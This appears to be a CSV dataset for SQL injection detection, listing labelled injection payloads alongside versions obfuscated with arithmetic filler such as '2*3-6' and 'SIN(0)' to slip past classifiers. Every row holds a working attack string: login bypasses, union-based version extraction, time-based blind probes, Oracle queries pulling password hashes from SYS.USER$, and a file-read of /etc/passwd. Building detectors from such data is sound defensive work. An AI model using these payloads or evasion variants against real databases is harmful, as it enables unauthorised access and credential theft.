,Query,Label,Original
10,? Or 2*3-6 or  8-8+2/2-1+1+2/2-1+8-8=2*3-6+2*3-6+1+0 -- ,1,? or 1  =  1 --
11, )   Or SIN(0) or 2/2-1 Or 0 Or   (   0+2*3-6+'a'+2/2-1+2/2-1+8-8=8-8+0+'a+2/2-1+SIN(0)+8-8 ,1, )   or   (  'a'  =  'a
12,admin' Or 8-8 Or  0+0+2*3-6+1=0+1+2/2-1+2/2-1+8-8+2/2-1 #,1,admin' or 1  =  1#
13," select * from users where  0+8-8+id+0=SIN(0)+1+0+SIN(0)+SIN(0) OR 8-8 OR SIN(0) oR SIN(0) Or  ""  (  ] "" or SIN(0) OR  0+2/2-1+2/2-1+2/2-1+1+2/2-1=8-8+1+2*3-6+2*3-6 -- 1 ",1," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1"
14,or  0+8-8+1+2/2-1=0+1+2*3-6+2*3-6+8-8 -- ,1,or 1  =  1 --
15," And 1 and 1 AND 1 And  0+0+1+SIN(0)=0+utl_inaddr.get_host_address+0+0+SIN(0)+0   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE  LIMIT+8-8+8-8=8-8+8-8+0+5+SIN(0)+0   )    )    AND  'i'+0+8-8+SIN(0)=2/2-1+SIN(0)+'i+8-8+2*3-6+8-8 ",1," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i"
16," select * from users where  2*3-6+2*3-6+id+8-8+0+0=0+2*3-6+0+'1'+2/2-1 %!<@ union select 1,version  (    )   -- 1' ",1," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'"
17," select * from users where  2*3-6+8-8+2/2-1+id=1+8-8+8-8+SIN(0)+0+8-8 or 2/2-1 OR  ""&  (   "" Or 8-8 or  2/2-1+2*3-6+0+1+0=SIN(0)+SIN(0)+2/2-1+1+2/2-1+0 -- 1 ",1," select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1"
18," select * from users where  2*3-6+2*3-6+8-8+id+2*3-6+8-8=2/2-1+0+2/2-1+1+8-8+0 Or 8-8 OR 0 or SIN(0) ||  ""?  (   "" OR 8-8 OR 0 OR  0+2*3-6+1+8-8=0+2*3-6+1+2*3-6+2*3-6 -- 1 ",1," select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1"
19,distinct ,1,distinct
20,select * from users where  8-8+2/2-1+id+2/2-1+2/2-1=SIN(0)+2/2-1+2/2-1+'1'+8-8+0 *  (  \  )   oR 2/2-1 or 0 or  8-8+2*3-6+1+0+0+2/2-1=0+1+SIN(0)+SIN(0)+2*3-6+0 -- 1' ,1,select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1'
21,"1 aND 1 aND ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where  xtype+0+0=SIN(0)+'u'+2*3-6+8-8+2*3-6  )  , 1, 1   )    )     )   > 116 ",1,"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116"
22,select * from users where  0+id+2*3-6+SIN(0)+0+SIN(0)=SIN(0)+1+0+SIN(0) or 8-8 OR \.<\ or  0+8-8+1+2*3-6+0+2/2-1=1+2*3-6+SIN(0)+0 -- 1 ,1,select * from users where id  =  1 or \.<\ or 1  =  1 -- 1
23,"admin "" Or 0 OR  ""1 "" 0+0+=SIN(0)++0+2/2-1 ""1 ""-- ",1,"admin"" or ""1""  =  ""1""--"
24," select * from users where  8-8+2/2-1+SIN(0)+id+0=0+1+2/2-1+0+2/2-1+8-8 Or 2*3-6 Or  ""%{ "" or 0 or  SIN(0)+1+0+SIN(0)=1+0+SIN(0) -- 1 ",1," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1"
25,insert ,1,insert
26," select * from users where  2/2-1+8-8+2/2-1+id+2*3-6=0+2*3-6+1+0+2/2-1+2*3-6 OR 0 OR 1# "" ?+0+2*3-6+2*3-6=8-8+2*3-6+2/2-1+1+2*3-6 || 2*3-6 OR 2/2-1 || 0 or  2*3-6+2/2-1+8-8+1+0+2/2-1=0+2/2-1+1+2*3-6+2*3-6+SIN(0) -- 1 ",1," select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1"
27," select * from users where  0+0+id+2*3-6+0+SIN(0)=SIN(0)+2*3-6+1+2*3-6+0 or 2/2-1 Or  ""%? "" OR 8-8 Or  SIN(0)+1+0=2*3-6+0+1+2*3-6+8-8 -- 1 ",1," select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1"
28," AND 1 aND 1 aNd 1 aND 1 aND  2*3-6+1+2/2-1=2*3-6+utl_inaddr.get_host_address+2/2-1+0   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE  SIN(0)+LIMIT+8-8=8-8+2*3-6+8-8+8   )    )    AND  2/2-1+'i'+8-8+2*3-6=SIN(0)+8-8+'i+8-8+SIN(0)+SIN(0) ",1," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i"
29," select * from users where  id+8-8+SIN(0)=8-8+2/2-1+0+1+SIN(0) OR 2/2-1 oR 2/2-1 ||  ""?# "" Or 0 or  1+8-8+2/2-1=2*3-6+1+8-8+2/2-1 -- 1 ",1," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1"
30,"or  2/2-1+0+1+8-8+8-8=2*3-6+2*3-6+1+2*3-6 OR 2/2-1 oR 2/2-1 ||  "" "" 8-8++2/2-1+SIN(0)=SIN(0)++2/2-1+SIN(0) ",1,"or 1  =  1 or """"  =  "
31, 8-8+2/2-1+0+0+8-8+/**/or/**/1/**/=2*3-6+/**/1+0 ,1,/**/or/**/1/**/  =  /**/1
32," select * from users where  2/2-1+2*3-6+id+0+2*3-6=2/2-1+8-8+1 Or 8-8 Or  "".  (   "" Or 8-8 or  2/2-1+8-8+SIN(0)+0+1+8-8=8-8+8-8+1 -- 1 ",1," select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1"
33," select * from users where  2*3-6+2/2-1+id+2*3-6=0+2*3-6+'1'+0+SIN(0)+8-8 union select ||/1,version  (    )   -- 1' ",1," select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'"
34," select * from users where  2*3-6+id+2/2-1+2*3-6=0+0+'1'+8-8+0+SIN(0) union select +\.,@@VERSION -- 1' ",1," select * from users where id  =  '1' union select +\.,@@VERSION -- 1'"
35,or  0+2*3-6+SIN(0)+1+SIN(0)+2/2-1=0+8-8+1/* ,1,or 1  =  1/*
36,%27 Or SIN(0) OR 2/2-1 Or  2/2-1+1+2/2-1+2/2-1=2/2-1+SIN(0)+8-8+1+8-8 ,1,%27 or 1  =  1
37," select * from users where  8-8+8-8+id+8-8=1+2/2-1+2*3-6+SIN(0)+0+2/2-1 <@&@ union select 1,version  (    )   -- 1 ",1," select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1"
38," select * from users where  SIN(0)+id+SIN(0)+2*3-6+2*3-6+SIN(0)=2/2-1+2*3-6+8-8+'1' union select $*$,@@VERSION -- 1' ",1," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'"
39,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ... ",1,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ..."
40," select * from users where  2*3-6+8-8+8-8+id+0+2/2-1=SIN(0)+2/2-1+'1' Or 2*3-6 OR SIN(0) oR $  2/2-1+0+2*3-6+SIN(0)+1=2/2-1+2*3-6+8-8+SIN(0)+1+8-8 union select 1,@@VERSION -- 1' ",1," select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'"
41,select * from users where  2/2-1+id+2/2-1+8-8+SIN(0)+SIN(0)=2/2-1+1+2/2-1+8-8 Or 2*3-6 or \.<1 or  8-8+SIN(0)+8-8+1+SIN(0)=0+2*3-6+1+2/2-1+2*3-6 -- 1 ,1,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1
42," select * from users where  SIN(0)+2*3-6+SIN(0)+id='1'+2/2-1+8-8+0 Or 8-8 Or SIN(0) or \<\ union select 1,@@VERSION -- 1' ",1," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'"
43," select * from users where  8-8+2/2-1+id+8-8+2*3-6=2*3-6+1+0 union select 1||1,version  (    )   -- 1 ",1," select * from users where id  =  1 union select 1||1,version  (    )   -- 1"
44," select * from users where  2/2-1+2*3-6+id+8-8+SIN(0)+2*3-6=2*3-6+2/2-1+2/2-1+1+8-8+SIN(0) ||1 union select null,banner from v$version where  2/2-1+rownum+SIN(0)+SIN(0)+2*3-6+8-8=8-8+8-8+2/2-1+0+1+2/2-1 -- 1 ",1," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1"
45,select * from users where  0+id+8-8+0+SIN(0)+0=8-8+'1'+0+0+2/2-1+0 or SIN(0) || 0 || SIN(0) OR \.<\ or  SIN(0)+1+2/2-1=1+2*3-6+SIN(0)+2/2-1 -- 1' ,1,select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1'
46," select * from users where  0+SIN(0)+id+SIN(0)=8-8+1+2*3-6+SIN(0)+0 or 8-8 OR SIN(0) Or  ""]{ "" or 0 oR 2/2-1 oR  2*3-6+1+0+0+0+0=8-8+8-8+SIN(0)+1+2*3-6+8-8 -- 1 ",1," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1"
47," select * from users where  0+id+2/2-1+8-8+2/2-1=2/2-1+SIN(0)+2/2-1+2*3-6+1+8-8 oR 2*3-6 Or 2/2-1 or  "".@ "" or 2*3-6 Or  0+2/2-1+2*3-6+0+SIN(0)+1=2*3-6+2/2-1+1+SIN(0)+2*3-6 -- 1 ",1," select * from users where id  =  1 or "".@"" or 1  =  1 -- 1"
48," select * from users where  0+2*3-6+id=2*3-6+2*3-6+0+0+1 or 2/2-1 OR  ""$[ "" OR 0 or SIN(0) Or  SIN(0)+1+2/2-1+2/2-1=2*3-6+8-8+1+2*3-6+2*3-6 -- 1 ",1," select * from users where id  =  1 or ""$["" or 1  =  1 -- 1"
49,or 1 --' ,1,or 1 --'
50," select * from users where  2*3-6+0+SIN(0)+id+2/2-1+0=0+2*3-6+2/2-1+1 Or 2*3-6 Or  "",; "" or SIN(0) OR 8-8 oR SIN(0) Or  8-8+8-8+1=2/2-1+SIN(0)+1+8-8+SIN(0) -- 1 ",1," select * from users where id  =  1 or "",;"" or 1  =  1 -- 1"
51,"admin "" OR 2*3-6 or  SIN(0)+SIN(0)+1+0=1+0+8-8+2/2-1+2/2-1 #",1,"admin"" or 1  =  1#"
52," select * from users where  0+0+SIN(0)+id+2/2-1+2*3-6=2*3-6+0+1+2*3-6+8-8 +  (  1  )   union select null,banner from v$version where  0+rownum+2*3-6+2*3-6+8-8=0+2*3-6+1 -- 1 ",1," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1"
53,\x27UNION SELECT ,1,\x27UNION SELECT
54,PRINT ,1,PRINT
55," select * from users where  8-8+SIN(0)+id+SIN(0)=8-8+2/2-1+2/2-1+'1' union select   (  \.  )  ,@@VERSION -- 1' ",1," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'"
56,or  8-8+8-8+1+8-8+8-8+2/2-1=0+0+2/2-1+1--+0+8-8 ,1,or 1  =  1--
57,1 OR 2*3-6 oR 0 || pg_sleep  (  __TIME__  )  -- ,1,1 or pg_sleep  (  __TIME__  )  --
58," select * from users where  SIN(0)+id+8-8+0+0=8-8+SIN(0)+1+2/2-1+2*3-6+SIN(0) or SIN(0) Or  "",# "" Or 2/2-1 || 0 ||  2/2-1+2*3-6+0+1=2*3-6+1+2/2-1+2/2-1 -- 1 ",1," select * from users where id  =  1 or "",#"" or 1  =  1 -- 1"
59,admin'  )   Or 8-8 or 0 oR   (   2*3-6+SIN(0)+2/2-1+'1'+8-8+2*3-6=2*3-6+2/2-1+'1'/*+2*3-6 ,1,admin'  )   or   (  '1'  =  '1'/*
60,or 2 between 1 and 1 aNd 3 ,1,or 2 between 1 and 3
61," select * from users where  2/2-1+id+0+SIN(0)=SIN(0)+1+0 or 0 OR SIN(0) or  ""  )  . "" SIN(0)+0++SIN(0)+2*3-6+2*3-6=1+SIN(0)+2*3-6+SIN(0)+8-8 or 2/2-1 Or 8-8 OR 2/2-1 ||  1+SIN(0)+2*3-6+2/2-1+0=8-8+1+0+8-8 -- 1 ",1," select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1"
62," select * from users where  8-8+id+2*3-6+8-8+0+2/2-1=2/2-1+1+8-8+2*3-6 || 2/2-1 or 2/2-1 or 2*3-6 Or 1# "". union select null,version  (    )   -- 1 ",1," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1"
63,admin' oR 0 oR 0 || SIN(0) or  0+'1'+SIN(0)+SIN(0)+2/2-1+8-8=8-8+8-8+2*3-6+2/2-1+'1 ,1,admin' or '1'  =  '1
64,; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' -- ,1,; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --
65," select * from users where  2/2-1+id+0=2/2-1+SIN(0)+1+SIN(0) union select 1,banner from v$version where  2*3-6+0+0+rownum+2/2-1=0+SIN(0)+8-8+1+SIN(0)+2/2-1 -- 1 ",1," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1"
66," "" || SIN(0) oR 0 Or SIN(0) Or  SIN(0)+0+SIN(0)+2/2-1=0+8-8+SIN(0)+0 -- ",1,""" or 0  =  0 --"
67," select * from users where  id+0+SIN(0)+0+2*3-6=0+1+SIN(0)+2*3-6 union select @ $_,version  (    )   -- 1 ",1," select * from users where id  =  1 union select @ $_,version  (    )   -- 1"
68,select * from users where  0+2/2-1+0+id+8-8+2*3-6=8-8+2/2-1+1+SIN(0)+8-8 <@.$ Or SIN(0) Or SIN(0) or  0+0+1+0+2/2-1=2*3-6+SIN(0)+1+2/2-1 -- 1 ,1,select * from users where id  =  1 <@.$ or 1  =  1 -- 1
69," select * from users where  id+SIN(0)+8-8+8-8=0+8-8+1 OR 2/2-1 oR 0 ||  ""%. "" Or 0 or  2*3-6+0+SIN(0)+1=2/2-1+0+1+0+0+SIN(0) -- 1 ",1," select * from users where id  =  1 or ""%."" or 1  =  1 -- 1"
70," select * from users where  2/2-1+SIN(0)+id+8-8=SIN(0)+2/2-1+2/2-1+8-8+1+SIN(0) + $+*$ union select null,@@VERSION -- 1 ",1," select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1"
71," select * from users where  SIN(0)+2*3-6+id=2/2-1+1+8-8+8-8+2/2-1+2*3-6 OR 8-8 || SIN(0) || 2*3-6 OR  "",. "" or 2*3-6 OR  0+8-8+2*3-6+1=2*3-6+0+1+SIN(0)+SIN(0) -- 1 ",1," select * from users where id  =  1 or "",."" or 1  =  1 -- 1"
72,char%4039%41%2b%40SELECT ,1,char%4039%41%2b%40SELECT
73," select * from users where  id+2/2-1+8-8=2*3-6+8-8+1+2/2-1+8-8+SIN(0) or 2/2-1 Or 8-8 Or  ""1& "" or 2/2-1 Or SIN(0) oR  2/2-1+2/2-1+1+2*3-6+0=SIN(0)+8-8+2/2-1+1 -- 1 ",1," select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1"
74,admin'  )   Or 8-8 || 0 ||   (   8-8+'1'+0+SIN(0)=SIN(0)+SIN(0)+'1+2*3-6+0+2/2-1 ,1,admin'  )   or   (  '1'  =  '1
75,declare @s varchar   (  200  )   select  2*3-6+8-8+@s+0=0+0+0x73656c6+SIN(0) ... ,1,declare @s varchar   (  200  )   select @s   =   0x73656c6 ...
76,"or  SIN(0)+8-8+0=2*3-6+0+8-8 # "" ",1,"or 0  =  0 #"""
77," select * from users where  SIN(0)+SIN(0)+0+SIN(0)+id=2/2-1+SIN(0)+1+2*3-6 Or SIN(0) oR 2/2-1 or  "".] "" OR SIN(0) or  SIN(0)+1+2/2-1+8-8+SIN(0)=0+SIN(0)+1+8-8+2*3-6+0 -- 1 ",1," select * from users where id  =  1 or "".]"" or 1  =  1 -- 1"
78,  )   or 8-8 || 0 OR 8-8 or   (   2*3-6+2*3-6+SIN(0)+'x'+2/2-1=8-8+SIN(0)+'x+2*3-6 ,1,  )   or   (  'x'  =  'x
79," select * from users where  SIN(0)+SIN(0)+0+2/2-1+id=2/2-1+2/2-1+1.<@$ union select 1,version  (    )   -- 1 ",1," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1"
80,$  (  sleep 50  )  ,1,$  (  sleep 50  ) 
81," select * from users where  SIN(0)+0+2/2-1+SIN(0)+id=2*3-6+0+1+SIN(0)+2*3-6 *1 union select null,banner from v$version where  SIN(0)+rownum+0=SIN(0)+1+2*3-6+8-8 -- 1 ",1," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1"
82,"1 union all select 1,2,3,4,5,6,name from sysobjects where  SIN(0)+2*3-6+8-8+xtype=0+'u'+SIN(0)+0+2*3-6+8-8 -- ",1,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --"
83," select * from users where  id+0+2*3-6=8-8+2*3-6+SIN(0)+2*3-6+1 OR SIN(0) or 2/2-1 oR SIN(0) Or 1# "". union select 'a',version  (    )   -- 1 ",1," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1"
84," select * from users where  0+0+2/2-1+id=0+2/2-1+1 OR SIN(0) OR 1# ""; union select null,version  (    )   -- 1 ",1," select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1"
85," select * from users where  8-8+0+id=8-8+0+SIN(0)+1+2/2-1+2*3-6 oR 8-8 Or 2*3-6 Or 2/2-1 OR 1# ""? OR 8-8 oR 8-8 ||  2*3-6+1+0+SIN(0)+2*3-6=2*3-6+1+2*3-6 -- 1 ",1," select * from users where id  =  1 or 1#""? or 1  =  1 -- 1"
86," ""a "" "" Or 8-8 oR 2*3-6 OR  1+0+8-8=0+SIN(0)+2*3-6+1--+2*3-6+2/2-1 "" ",1,"""a"""" or 1  =  1--"""
87," select * from users where  id+2*3-6+8-8+SIN(0)=0+2*3-6+1+8-8 *1 union select 1,banner from v$version where  0+2/2-1+rownum+SIN(0)+2*3-6+SIN(0)=0+2*3-6+1+0 -- 1 ",1," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1"
88," AND 1 aNd 1 AND  8-8+2*3-6+1+2*3-6+2/2-1=2/2-1+utl_inaddr.get_host_address+2*3-6+8-8+2*3-6+2*3-6   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE  8-8+8-8+LIMIT+2*3-6+2/2-1=4+2*3-6+SIN(0)+2/2-1+2*3-6   )    )    AND  2*3-6+0+'i'=8-8+'i+8-8 ",1," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i"
89," select * from users where  0+2/2-1+id+2/2-1=2*3-6+2/2-1+'1'+SIN(0) union select   (  \  )  ,@@VERSION -- 1' ",1," select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'"
90,1 AND 1 aND user_name  (     2/2-1+2*3-6+SIN(0)+8-8+)+8-8=2*3-6+'dbo'+8-8 ,1,1 and user_name  (    )     =   'dbo'
91,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' -- ",1,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --"
92," select * from users where  2*3-6+2/2-1+2/2-1+0+id=8-8+2*3-6+SIN(0)+1 or 8-8 or 8-8 || 1# ""$ union select 1,version  (    )   -- 1 ",1," select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1"
93," select * from users where  2/2-1+2*3-6+id+2/2-1+8-8+SIN(0)=SIN(0)+1+0 or 2*3-6 or 1# ""{ union select null,version  (    )   -- 1 ",1," select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1"
94,select * from users where  2/2-1+id+2*3-6=8-8+2/2-1+SIN(0)+'1'+2*3-6 *$ . OR SIN(0) Or  1+0+0=2/2-1+SIN(0)+1+2*3-6+2/2-1 -- 1' ,1,select * from users where id  =  '1' *$ . or 1  =  1 -- 1'
95,select * from users where  0+SIN(0)+8-8+id+2/2-1=1+0+2/2-1+2/2-1 +$+. OR 2/2-1 Or 0 oR  2/2-1+1+0=2/2-1+2*3-6+2*3-6+1+SIN(0) -- 1 ,1,select * from users where id  =  1 +$+. or 1  =  1 -- 1
96,select * from users where  2/2-1+id+2/2-1+0+8-8+SIN(0)=2*3-6+1+2/2-1 or 2/2-1 Or 8-8 Or 8-8 or   (  \+   2/2-1+)+0+2/2-1=8-8+1+2/2-1+2/2-1+8-8 or  1+SIN(0)+SIN(0)+8-8=0+0+1 -- 1 ,1,select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1
97," AND 1 and 1 AND  2*3-6+1+0=utl_inaddr.get_host_address+SIN(0)+2*3-6   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE  SIN(0)+LIMIT+8-8+8-8+SIN(0)=8-8+8-8+6+0+2/2-1   )    )    AND  2/2-1+'i'+SIN(0)='i+SIN(0)+2/2-1 ",1," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i"
98,or  0+1+SIN(0)+2/2-1=SIN(0)+1+2*3-6 Or 8-8 OR  SIN(0)+''+2/2-1+2*3-6+2/2-1+8-8=2/2-1+'+8-8+2/2-1+2/2-1 ,1,or 1  =  1 or ''  =  '
99,select * from users where  2*3-6+2/2-1+2*3-6+0+id=1+8-8+8-8   or 2*3-6 Or  2/2-1+1+8-8+2*3-6+2*3-6=1+2*3-6+2*3-6+2*3-6 -- 1 ,1,select * from users where id  =  1   or 1  =  1 -- 1
100,or 'text' > 't' ,1,or 'text' > 't'
101,"1234  "" AND 1 AND  2*3-6+1+0=8-8+0+8-8+0 UNION ALL SELECT  ""admin "",  ""81dc9bdb52d04dc20036dbd8313ed055 ",1,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055"
102," select * from users where  2*3-6+2*3-6+id=2/2-1+0+1+2/2-1+0+8-8 or 2*3-6 Or 8-8 or  ""%[ "" or 2/2-1 Or 2*3-6 || 8-8 OR  2*3-6+1+8-8+SIN(0)+2*3-6=SIN(0)+SIN(0)+1+8-8+2*3-6 -- 1 ",1," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1"
103," select * from users where  2/2-1+2*3-6+id+2/2-1=2/2-1+SIN(0)+8-8+1+8-8 Or 2*3-6 or SIN(0) OR 1# "" 0+8-8+;+8-8+8-8=2*3-6+SIN(0)+8-8+SIN(0)+1 union select 1,version  (    )   -- 1 ",1," select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1"
104,admin' or 0 oR SIN(0) OR 0 Or  2/2-1+'1'+2*3-6+2/2-1+0+0=SIN(0)+SIN(0)+'1'+2/2-1 #,1,admin' or '1'  =  '1'#
105,select * from users where  2/2-1+id+0+8-8=2/2-1+2*3-6+1+2/2-1 +$ 1 or 8-8 or  0+1+0+2*3-6+8-8=2/2-1+2*3-6+1 -- 1 ,1,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1
106,s ,1,s
